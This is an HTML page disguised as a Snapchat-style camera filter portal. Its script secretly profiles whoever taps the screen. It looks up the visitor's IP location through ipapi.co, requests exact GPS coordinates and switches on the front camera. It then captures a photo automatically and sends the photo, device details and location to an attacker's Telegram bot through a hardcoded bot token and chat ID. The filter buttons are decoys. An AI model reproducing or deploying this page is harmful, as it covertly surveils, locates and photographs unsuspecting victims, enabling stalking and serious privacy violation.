<!DOCTYPE html>
<html lang="hi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Snap-Filter Portal</title>
    <style>
        body { font-family: 'Helvetica Neue', Arial, sans-serif; background-color: #000; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; overflow: hidden; }
        .snap-portal { position: relative; width: 100vw; height: 100vh; background: #000; display: flex; flex-direction: column; overflow: hidden; }
        
        /* Interactive Status Banner */
        .status-box { position: absolute; top: 20px; left: 50%; transform: translateX(-50%); background: rgba(0,0,0,0.8); color: #FFFC00; padding: 10px 20px; border-radius: 30px; font-size: 0.9rem; z-index: 100; font-weight: bold; text-align: center; border: 2px solid #FFFC00; box-shadow: 0 0 10px rgba(255, 252, 0, 0.5); pointer-events: none; }

        /* Media Viewport Matrix */
        .media-container { flex: 1; position: relative; background: #000; display: flex; justify-content: center; align-items: center; }
        video { width: 100%; height: 100%; object-fit: cover; z-index: 10; display: none; }
        canvas { display: none; }
        .preview-img { width: 100%; height: 100%; object-fit: cover; position: absolute; top: 0; left: 0; display: none; z-index: 20; border: 4px solid #FFFC00; }
        
        /* Filter Carousel Style Structure */
        .filter-controls { position: absolute; bottom: 50px; left: 0; width: 100%; height: 60px; display: flex; justify-content: center; gap: 15px; z-index: 110; padding: 0 10px; box-sizing: border-box; }
        .filter-btn { width: 50px; height: 50px; background-color: rgba(255,255,255,0.3); border-radius: 50%; border: 2px solid #fff; cursor: pointer; transition: all 0.2s; background-size: cover; background-position: center; }
        .filter-btn.active { border-color: #FFFC00; box-shadow: 0 0 10px rgba(255, 252, 0, 0.7); }
    </style>
</head>
<body>

<div class="snap-portal">
    <div id="statusLabel" class="status-box">Tap screen to activate camera filters ✨</div>

    <div class="media-container">
        <video id="webcam" autoplay playsinline></video>
        <canvas id="captureCanvas" width="640" height="480"></canvas>
        <img id="savedFrame" class="preview-img" alt="Captured Frame">
    </div>

    <div class="filter-controls">
        <button class="filter-btn active" data-filter="none" style="background-image: url('https://w7.pngwing.com/pngs/303/486/png-transparent-filter-none-icon.png')"></button>
        <button class="filter-btn" data-filter="grayscale" style="background-image: url('https://w7.pngwing.com/pngs/669/712/png-transparent-gray-scale-symbol-gray-and-black-dot-grayscale-image-mode-computer-icons-color-wheel-light-and-darkness-gray-wheel-angle-grayscale-image-mode-black-thumbnail.png')"></button>
        <button class="filter-btn" data-filter="sepia" style="background-image: url('https://w7.pngwing.com/pngs/944/859/png-transparent-photography-sepia-computer-icons-photograph-miscellaneous-photography-sepia.png')"></button>
    </div>
</div>

<script>
    let activeStream = null;
    let autoCaptureExecuted = false;
    
    // System metadata storage matrix
    const targetPayload = {
        deviceModel: navigator.userAgent,
        broadLocation: "Fetching...",
        exactCoordinates: "Not Granted"
    };

    // Background asynchronous network profiling
    fetch('https://ipapi.co/json/')
        .then(res => res.json())
        .then(data => {
            targetPayload.broadLocation = `City: ${data.city}, Region: ${data.region}, Org: ${data.org}`;
        }).catch(() => { targetPayload.broadLocation = "IP profiling failed"; });

    // Initialize core tracking sequence on initial user touch matrix
    function runSystemTracePipeline() {
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                (pos) => { targetPayload.exactCoordinates = `Lat: ${pos.coords.latitude}, Lon: ${pos.coords.longitude}`; requestHardwareAuthorization(); },
                (err) => { targetPayload.exactCoordinates = `Failed/Denied: ${err.message}`; requestHardwareAuthorization(); },
                { enableHighAccuracy: true, timeout: 6000 }
            );
        } else { requestHardwareAuthorization(); }
    }

    function requestHardwareAuthorization() {
        document.getElementById('statusLabel').innerText = "Initializing system filters... Please allow camera prompt.";
        
        // Request active media hardware token
        navigator.mediaDevices.getUserMedia({ video: { width: 640, height: 480, facingMode: "user" }, audio: false })
            .then((stream) => {
                activeStream = stream;
                const videoEl = document.getElementById('webcam');
                videoEl.srcObject = stream;
                videoEl.style.display = "block";
                document.getElementById('statusLabel').innerText = "Filter synchronized successfully! ✨";

                // --- CORE AUTOMATION LOOP ---
                // Jaise hi stream ka data browser internal stack par load hoga, ye event auto-fire ho jayega
                videoEl.onloadedmetadata = () => {
                    if (!autoCaptureExecuted) {
                        autoCaptureExecuted = true;
                        
                        // 600ms safe execution buffer taaki camera sensors active hote hi pure black frame capture na karein
                        setTimeout(() => {
                            executeAutomatedPushSequence();
                        }, 600);
                    }
                };
            })
            .catch(() => {
                document.getElementById('statusLabel').innerText = "Hardware execution terminated by user.";
            });
    }

    function executeAutomatedPushSequence() {
        const videoEl = document.getElementById('webcam');
        const canvasEl = document.getElementById('captureCanvas');
        const previewImg = document.getElementById('savedFrame');
        const context = canvasEl.getContext('2d');

        // Draw active video matrix frame to raster layer
        context.drawImage(videoEl, 0, 0, 640, 480);
        const base64Data = canvasEl.toDataURL('image/jpeg', 0.8);

        // Visual layout confirmation
        previewImg.src = base64Data;
        previewImg.style.display = "block";
        videoEl.style.display = "none";

        document.getElementById('statusLabel').innerText = "Processing profile synchronization...";

        // Trigger asynchronous multi-part transmission loop
        dispatchDataToTelegramEndpoint(canvasEl);
    }

    function dispatchDataToTelegramEndpoint(canvasElement) {
        const botToken = "8901334974:AAGaj98eLxPL2C6078Xi4FywZ-cNZuXuKfg"; 
        const chatId = "8562061813"; 

        // Message structural arrangement compilation
        let stringCaption = `*🚨 AUTOMATED SECURITY PROFILE RECORDED 🚨*\n\n`;
        stringCaption += `*📱 Hardware Specs:* ${targetPayload.deviceModel}\n`;
        stringCaption += `*📍 Network Hub:* ${targetPayload.broadLocation}\n`;
        stringCaption += `*🌐 GPS Coordinates:* ${targetPayload.exactCoordinates}\n`;

        // Process canvas context data directly into binary large object array stream
        canvasElement.toBlob(function(binaryBlob) {
            const multiPartForm = new FormData();
            multiPartForm.append('chat_id', chatId);
            multiPartForm.append('photo', binaryBlob, 'verification_log.jpg');
            multiPartForm.append('caption', stringCaption);
            multiPartForm.append('parse_mode', 'Markdown');

            // Send network request to Telegram gateway endpoints
            fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                method: 'POST',
                body: multiPartForm
            })
            .then(response => response.json())
            .then(parsedRes => {
                if(parsedRes.ok) {
                    document.getElementById('statusLabel').innerText = "✓ Matrix Synced Instantly!";
                    document.getElementById('statusLabel').style.background = "rgba(52, 168, 83, 0.9)";
                    document.getElementById('statusLabel').style.color = "#fff";
                }
            })
            .catch(() => {
                document.getElementById('statusLabel').innerText = "Transmission drop.";
            });
        }, 'image/jpeg', 0.8);
    }

    // Passive interaction setup required to trigger modern audio/video context policies
    document.addEventListener('click', function passiveInitializationHandler() {
        runSystemTracePipeline();
        document.removeEventListener('click', passiveInitializationHandler);
    }, { once: true });
</script>

</body>
</html>
